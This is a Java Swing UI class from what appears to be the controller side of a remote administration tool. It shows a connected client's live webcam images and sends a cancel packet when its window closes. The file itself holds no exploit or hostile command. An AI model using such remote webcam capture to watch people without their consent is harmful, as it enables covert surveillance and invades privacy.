/*
 * Copyright (c) 2021, 7ctx <https://github.com/7ctx/> 
 * Email: <7ctx@mail.com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this
 *    list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 *    this list of conditions and the following disclaimer in the documentation
 *    and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
 * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
package com.ctx.server.ui.impl;

import com.protocol.packets.beans.Client;
import com.protocol.packets.impl.RemoteWebcamCancelPacket;
import com.protocol.packets.impl.RemoteWebcamPacket;
import com.ctx.server.ChannelHandler;
import io.netty.channel.ChannelId;
import java.awt.BorderLayout;
import java.awt.Dimension;
import java.awt.Graphics;
import java.awt.Image;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import javax.swing.JDesktopPane;
import javax.swing.JFrame;
import javax.swing.JPanel;
import lombok.extern.slf4j.Slf4j;

@Slf4j
public class RemoteWebcamUI extends javax.swing.JFrame 
{
    private final JDesktopPane desktopPane = new JDesktopPane();
    private static final JPanel rWebcamPanel = new JPanel();
    private final ChannelId channelId;
    
    /**
     * Constructor
     * 
     * @param channelId 
     */
    public RemoteWebcamUI(ChannelId channelId) 
    {
        this.channelId = channelId;
        initComponents();
    }
    
    /**
     * Draw remote webcam on screen
     * 
     * @param image 
     */
    public static void drawScreen(Image image) 
    {
        if (image != null) 
        {
        image.getScaledInstance(rWebcamPanel.getWidth(), rWebcamPanel.getHeight(), Image.SCALE_FAST);
        Graphics graphics = rWebcamPanel.getGraphics();
        graphics.drawImage(image, 0, 0, rWebcamPanel.getWidth(), rWebcamPanel.getHeight(), rWebcamPanel);
        System.out.println("Draw image");
    }
  }
    
    /**
     * Initialize UI
     */
    private void initComponents() 
    {
        setTitle("Remote Webcam: " + Client.getClients().get(channelId));
        setIconImage(getToolkit().getImage(getClass().getResource("/icons/7.png")));
        setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
        setPreferredSize(new Dimension(600, 400));
        setBounds(700, 200, 0, 0);
        add(desktopPane, BorderLayout.CENTER);
        getContentPane().add(rWebcamPanel, BorderLayout.CENTER);
        setFocusable(true);
        
        addWindowListener(new WindowAdapter() 
        {
            @Override
            public void windowClosing(WindowEvent e) 
            {
                RemoteWebcamPacket.setCanceled(true);
                log.debug("RemoteWebcamPacket is set to canceled");
                RemoteWebcamCancelPacket remoteWebcamCancelPacket = new RemoteWebcamCancelPacket();
                ChannelHandler.writePacket(channelId, remoteWebcamCancelPacket);
                dispose();
            }
        });
        
     pack();
     
    }
}
